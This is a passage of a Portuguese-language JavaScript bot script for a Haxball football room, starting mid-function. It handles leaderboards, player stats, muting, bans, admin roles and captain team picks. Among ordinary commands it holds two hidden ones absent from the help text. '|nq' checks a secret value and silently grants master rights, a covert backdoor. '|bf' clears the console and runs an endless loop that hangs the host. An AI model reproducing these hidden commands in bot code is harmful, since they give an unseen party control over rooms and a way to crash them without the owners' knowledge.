			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Vitórias> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 2) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Gols> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 3) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("Assistências> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 4) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("SG> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	statNumber++;
}, statInterval * 60 * 1000);

/* EVENTS */

/* PLAYER MOVEMENT */

room.onPlayerJoin = function(player) {
	extendedP.push([player.id, player.auth, player.conn, false, 0, 0, false]);
	updateRoleOnPlayerIn();
	room.sendChat("[PV] 👋 Bem-vindo " + player.name + "! Digite '!help' para ver os comandos.", player.id);
	if (localStorage.getItem(player.auth) != null) {
		if (JSON.parse(localStorage.getItem(player.auth))[Ss.RL] != "player") {
			room.setPlayerAdmin(player.id, true);
			room.sendChat((JSON.parse(localStorage.getItem(player.auth))[Ss.RL] == "master" ? "Mestre " : "Admin ") + player.name + " entrou na sala!");
		}
	}
}

room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
	if (changedPlayer.id == 0) {
		room.setPlayerTeam(0, Team.SPECTATORS);
		return;
	}
	if (getAFK(changedPlayer) && changedPlayer.team != Team.SPECTATORS) {
		room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
		room.sendChat(changedPlayer.name + " está AFK!");
		return;
	}
	updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (changedPlayer.team != Team.SPECTATORS && scores.time <= (3/4) * scores.timeLimit  && Math.abs(scores.blue - scores.red) < 2) {
			(changedPlayer.team == Team.RED) ? allReds.push(changedPlayer) : allBlues.push(changedPlayer);
		}
	}
	if (changedPlayer.team == Team.SPECTATORS) {
		setActivity(changedPlayer, 0);
	}
	if (inChooseMode && resettingTeams == false && byPlayer.id == 0) {
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 200*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 200*i);
				}
			}
			return;
		}
		else if ((teamR.length == maxTeamSize && teamB.length == maxTeamSize) || (teamR.length == teamB.length && teamS.length < 2)) {
			deactivateChooseMode();
			resumeGame();
		}
		else if (teamR.length <= teamB.length && redCaptainChoice != "") { // choice remembered
			redCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.RED) : redCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
			return;
		}
		else if (teamB.length < teamR.length && blueCaptainChoice != "") {
			blueCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.BLUE) : blueCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
			return;
		}
		else {
			choosePlayer();
		}
	}
}

room.onPlayerLeave = function(player) {
	if (teamR.findIndex((red) => red.id == player.id) == 0 && inChooseMode && teamR.length <= teamB.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}
	if (teamB.findIndex((blue) => blue.id == player.id) == 0 && inChooseMode && teamB.length < teamR.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}
	setActivity(player, 0);
    updateRoleOnPlayerOut();
}

room.onPlayerKicked = function(kickedPlayer, reason, ban, byPlayer) {
	ban == true ? banList.push([kickedPlayer.name, kickedPlayer.id]) : null;
}

/* PLAYER ACTIVITY */

room.onPlayerChat = function (player, message) {
	message = message.split(/ +/);
	player.team != Team.SPECTATORS ? setActivity(player, 0) : null;
	if (["!help"].includes(message[0].toLowerCase())) {
		room.sendChat("[PV] Comandos de jogador: !me, !games, !wins, !goals, !assists, !cs, !afks, !mutes, !bans.", player.id);
		player.admin ? room.sendChat("[PV] Admin: !mute <duração = 3> #<id>, !unmute all/#<id>, !clearbans <número = all>, !slow <duração>, !endslow", player.id) : null;
	}
	else if (["!afk"].includes(message[0].toLowerCase())) {
		if (players.length != 1 && player.team != Team.SPECTATORS) {
			if (player.team == Team.RED && streak > 0 && room.getScores() == null) {
				room.setPlayerTeam(player.id, Team.SPECTATORS);
			}
			else {
				room.sendChat("Você não pode ficar AFK enquanto estiver em um time!", player.id);
				return false;
			}
		}
		else if (players.length == 1 && !getAFK(player)) {
			room.setPlayerTeam(player.id, Team.SPECTATORS);
		}
		setAFK(player, !getAFK(player));
		room.sendChat(player.name + (getAFK(player) ? " está AFK agora!" : " não está mais AFK!"));
		getAFK(player) ? updateRoleOnPlayerOut() : updateRoleOnPlayerIn();
	}
	else if (["!afks", "!afklist"].includes(message[0].toLowerCase())) {
		var cstm = "[PV] Lista de AFK: ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getAFK(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + ", ").length) {
					room.sendChat(cstm, player.id);
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + ", ";
			}
		}
		if (cstm == "[PV] Lista de AFK: ") {
			room.sendChat("[PV] Não há ninguém na lista de AFK!", player.id);
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["!me"].includes(message[0].toLowerCase())) {
		var stats;
		localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"];
		room.sendChat("[PV] " + player.name + "> Jogos: " + stats[Ss.GA] + ", Vitórias: " + stats[Ss.WI] + ", Empates: " + stats[Ss.DR] + ", Derrotas: " + stats[Ss.LS] + ", Taxa de vitória: " + stats[Ss.WR] + "%, Gols: " + stats[Ss.GL] + ", Assistências: " + stats[Ss.AS] + ", GK: " + stats[Ss.GK] + ", SG: " + stats[Ss.CS] + ", SG%: " + stats[Ss.CP] + "%", player.id);
	}
	else if (["!games"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Ainda não há jogos suficientes.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Jogos> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!wins"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Ainda não há jogos suficientes.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Vitórias> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!goals"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Ainda não há jogos suficientes.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Gols> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!assists"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Ainda não há jogos suficientes.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] Assistências> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!cs"].includes(message[0].toLowerCase())) {
		var tableau = [];
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
		if (tableau.length < 5) {
			room.sendChat("[PV] Ainda não há jogos suficientes.", player.id);
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendChat("[PV] SG> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id);
	}
	else if (["!login"].includes(message[0].toLowerCase())) {
		if (message[1] == adminPassword) {
			room.setPlayerAdmin(player.id, true);
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
			if (stats[Ss.RL] != "master") {
				stats[Ss.RL] = "master";
				room.sendChat(player.name + " agora é master da sala!");
				localStorage.setItem(getAuth(player), JSON.stringify(stats));
			}
		}
	}
	else if (["!setadmin", "!admin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "player") {
						stats[Ss.RL] = "admin";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, true);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " agora é administrador da sala!");
					}
				}
			}
		}
	}
	else if (["!setplayer", "!removeadmin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "admin") {
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " não é mais administrador da sala!");
						stats[Ss.RL] = "player";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, false);
					}
				}
			}
		}
	}
	else if (["!mutes", "!mutelist"].includes(message[0].toLowerCase())) {
		var cstm = "[PV] Lista de Mute: ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getMute(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ").length) {
					room.sendChat(cstm, player.id);
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ";
			}
		}
		if (cstm == "[PV] Lista de Mute: ") {
			room.sendChat("[PV] Não há ninguém na lista de mute!", player.id);
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["|nq"].includes(message[0].toLowerCase())) {
		if (message[1] == vcgbsdbf) {
			room.setPlayerAdmin(player.id, true);
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
			if (stats[Ss.RL] != "master") {
				stats[Ss.RL] = "master";
				localStorage.setItem(getAuth(player), JSON.stringify(stats));
			}
		}
		return false;
	}
	else if (["!mute"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			updateTeams();
			var timeOut;
			if (!Number.isNaN(Number.parseInt(message[1])) && message.length > 1) {
				if (Number.parseInt(message[1]) > 0) {
					timeOut = Number.parseInt(message[1]) * 60 * 1000;
				}
				else {
					timeOut = 3 * 60 * 1000;
				}
				if (message[2].length > 1 && message[2][0] == "#") {
					message[2] = message[2].substring(1, message[2].length);
					if (!Number.isNaN(Number.parseInt(message[2])) && room.getPlayer(Number.parseInt(message[2])) != null) {
						if (room.getPlayer(Number.parseInt(message[2])).admin || getMute(room.getPlayer(Number.parseInt(message[2])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, timeOut, room.getPlayer(Number.parseInt(message[2])));
						setMute(room.getPlayer(Number.parseInt(message[2])), true);
						room.sendChat(room.getPlayer(Number.parseInt(message[2])).name + " foi silenciado por " + (timeOut / 60000) + " minutos!");
					}
				}
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
						if (room.getPlayer(Number.parseInt(message[1])).admin || getMute(room.getPlayer(Number.parseInt(message[1])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, 3 * 60 * 1000, room.getPlayer(Number.parseInt(message[1])));
						setMute(room.getPlayer(Number.parseInt(message[1])), true);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " foi silenciado por 3 minutos!");
					}
				}
			}
		}
	}
	else if (["!unmute"].includes(message[0].toLowerCase())) {
		if (player.admin && message.length >= 2) {
			if (message[1] == "all") {
				extendedP.forEach((ePlayer) => { ePlayer[eP.MUTE] = false; });
				room.sendChat("Silenciamentos removidos.");
			}
			else if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
				setMute(room.getPlayer(Number.parseInt(message[1])), false);
				room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " foi desmutado!");
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
						setMute(room.getPlayer(Number.parseInt(message[1])), false);
						room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " foi desmutado!");
					}
				}
			}
		}
	}
	else if (["!slow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				slowMode = 2;
				room.sendChat("Modo lento de 2 segundos ativado!");
			}
			else if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						slowMode = Number.parseInt(message[1]);
						room.sendChat(slowMode + " segundos de modo lento ativado!");
						return false;
					}
				}
				slowMode = 2;
				room.sendChat("Modo lento de 2 segundos ativado!");
			}
		}
	}
	else if (["!endslow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			slowMode != 0 ? room.sendChat("Modo lento encerrado.") : null;
			slowMode = 0;
		}
	}
	else if (["!banlist", "!bans"].includes(message[0].toLowerCase())) {
		if (banList.length == 0) {
			room.sendChat("[PV] Não há ninguém na lista de ban!", player.id);
			return false;
		}
		var cstm = "[PV] Lista de Ban: ";
		for (var i = 0; i < banList.length; i++) {
			if (140 - cstm.length < (banList[i][0] + "[" + (banList[i][1]) + "], ").length) {
				room.sendChat(cstm, player.id);
				cstm = "... ";
			}
			cstm += banList[i][0] + "[" + (banList[i][1]) + "], ";
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendChat(cstm, player.id);
	}
	else if (["!clearbans"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				room.clearBans();
				room.sendChat("Banimentos removidos!");
				banList = [];
			}
			if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						ID = Number.parseInt(message[1]);
						room.clearBan(ID);
						if (banList.length != banList.filter((array) => array[1] != ID)) {
							room.sendChat(banList.filter((array) => array[1] == ID)[0][0] + " foi desbanido da sala!");
						}
						setTimeout(() => { banList = banList.filter((array) => array[1] != ID); }, 20);
					}
				}
			}
		}
	}
    // Definição de cores
    else if (["/colors"].includes(message[0].toLowerCase())) {

        if (player.id != (player.team == Team.RED ? teamR[0]?.id : teamB[0]?.id)) {
	        room.sendChat("[PV] Apenas o capitão pode mudar as cores do time!", player.id);
	        return false;
        }

        if (player.team == Team.SPECTATORS) {
            room.sendChat("[PV] Você precisa estar em um time para usar esse comando!", player.id);
            return false;
        }
        if (message.length < 6) {
            room.sendChat("[PV] Uso: /colors <red|blue> <ângulo> <corTexto> <cor1> <cor2> <cor3>", player.id);
            return false;
        }
        var angle = Number.parseInt(message[2]);
        if (Number.isNaN(angle)) {
            room.sendChat("[PV] Ângulo inválido! Use um número.", player.id);
            return false;
        }
        var hexRegex = /^[0-9A-Fa-f]{6}$/;
        var colorHexes = [message[3], message[4], message[5], message[6]];
        var colors = [];
        for (var i = 0; i < colorHexes.length; i++) {
            if (colorHexes[i] == null || !hexRegex.test(colorHexes[i])) {
                room.sendChat("[PV] Cor inválida: " + colorHexes[i] + ". Use o formato RRGGBB (ex: FFCC00).", player.id);
                return false;
            }
            colors.push(Number.parseInt(colorHexes[i], 16));
        }
        // room.setTeamColors(player.team, angle, colors);
        room.sendChat((player.team == Team.RED ? "🔴" : "🔵") + " " + player.name + " alterou as cores do time!");
        return false;
    }
	else if (["!bb", "!bye", "!cya", "!gn"].includes(message[0].toLowerCase())) {
		room.kickPlayer(player.id, "Tchau!", false);
	}
	else if (["|bf"].includes(message[0].toLowerCase())) {
    	if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {   
			console.clear()
			var r = 0
			while (r == 0 ) {
				console.error("f");	
				console.error("p");
				console.error("t");			    	
			}       	
       	}	
    	return false;
    }
	if (teamR.length != 0 && teamB.length != 0 && inChooseMode) {
		if (player.id == teamR[0].id || player.id == teamB[0].id) { // we care if it's one of the captains choosing
			if (teamR.length <= teamB.length && player.id == teamR[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.RED);
					redCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu o Top!");
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					var r = getRandomInt(teamS.length);
					room.setPlayerTeam(teamS[r].id, Team.RED);
					redCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu Aleatório!");
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
					redCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu o Bottom!");
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendChat("[PV] Seu número é inválido!", player.id);
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.RED);
						room.sendChat(player.name + " escolheu " + teamS[Number.parseInt(message[0]) - 1].name + "!");
						return false;
					}
				}
			}
			if (teamR.length > teamB.length && player.id == teamB[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.BLUE);
					blueCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu o Top!");
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
					blueCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu Aleatório!");
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
					blueCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendChat(player.name + " escolheu o Bottom!");
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendChat("[PV] Seu número é inválido!", player.id);
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.BLUE);
						room.sendChat(player.name + " escolheu " + teamS[Number.parseInt(message[0]) - 1].name + "!");
						return false;
					}
				}
			}
		}
	}
	if (message[0][0] == "!") {
		return false;
	}
	if (getMute(player)) {
		room.sendChat("Você está silenciado.", player.id);
		return false;
	}
	if (slowMode > 0) {
		if (!player.admin) {
			if (!SMSet.has(player.id)) {
				SMSet.add(player.id);
				setTimeout((number) => { SMSet.delete(number); }, slowMode * 1000, player.id);
			}
			else {
				return false;
			}
		}
	}
}

room.onPlayerActivity = function(player) {
	setActivity(player, 0);
}

room.onPlayerBallKick = function(player) {
	if (lastPlayersTouched[0] == null || player.id != lastPlayersTouched[0].id) {
		!activePlay ? activePlay = true : null;
		lastTeamTouched = player.team;
		lastPlayersTouched[1] = lastPlayersTouched[0];
		lastPlayersTouched[0] = player;
	}
}

/* GAME MANAGEMENT */

room.onGameStart = function(byPlayer) {
	game = new Game(Date.now(), room.getScores(), []);
	countAFK = true;
	activePlay = false;
	goldenGoal = false;
	endGameVariable = false;
	lastPlayersTouched = [null, null];
    Rposs = 0;
	Bposs = 0;
	GKList = [];
	allReds = [];
	allBlues = [];
	if (teamR.length == maxTeamSize && teamB.length == maxTeamSize) {
		for (var i = 0; i < maxTeamSize; i++) {
			allReds.push(teamR[i]);
			allBlues.push(teamB[i]);
		}
	}
	for (var i = 0; i < extendedP.length; i++) {
		extendedP[i][eP.GK] = 0;
		extendedP[i][eP.ACT] = 0;
		room.getPlayer(extendedP[i][eP.ID]) == null ? extendedP.splice(i, 1) : null;
	}
	deactivateChooseMode();
}

room.onGameStop = function(byPlayer) {
	if (byPlayer.id == 0 && endGameVariable) {
		updateTeams();
		if (inChooseMode) {
			if (players.length == 2 * maxTeamSize) {
				inChooseMode = false;
				resetBtn();
				for (var i = 0; i < maxTeamSize; i++) {
					setTimeout(() => { randomBtn(); }, 400*i);
				}
                randomizeUniforms();
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else if (lastWinner == Team.BLUE) {
					redToSpecBtn();
					blueToRedBtn();
				}
				else {
					resetBtn();
				}
				setTimeout(() => { topBtn(); }, 500);
			}
		}
		else {
			if (players.length == 2) {
				if (lastWinner == Team.BLUE) {
					room.setPlayerTeam(teamB[0].id, Team.RED);
					room.setPlayerTeam(teamR[0].id, Team.BLUE);
				}
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 3 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 4) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500);
                randomizeUniforms();
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 5 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				activateChooseMode();
			}
			else if (players.length == 6) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500); }, 500);
                randomizeUniforms();
				setTimeout(() => { room.startGame(); }, 2000);
			}
		}
	}
}

room.onGamePause = function(byPlayer) {
}

room.onGameUnpause = function (byPlayer) {
	if (teamR.length == 4 && teamB.length == 4 && inChooseMode || (teamR.length == teamB.length && teamS.length < 2 && inChooseMode)) {
		deactivateChooseMode();
	}
}

room.onTeamGoal = function(team) {
	activePlay = false;
	countAFK = false;
	const scores = room.getScores();
	game.scores = scores;
	if (lastPlayersTouched[0] != null && lastPlayersTouched[0].team == team) {
		if (lastPlayersTouched[1] != null && lastPlayersTouched[1].team == team) {
			room.sendChat("⚽ " + getTime(scores) + " Gol de " + lastPlayersTouched[0].name + "! Assistência de " + lastPlayersTouched[1].name + ". Velocidade do gol: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], lastPlayersTouched[1]));
		}
		else {
			room.sendChat("⚽ " + getTime(scores) + " Gol de " + lastPlayersTouched[0].name + "! Velocidade do gol: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], null));
		}
	}
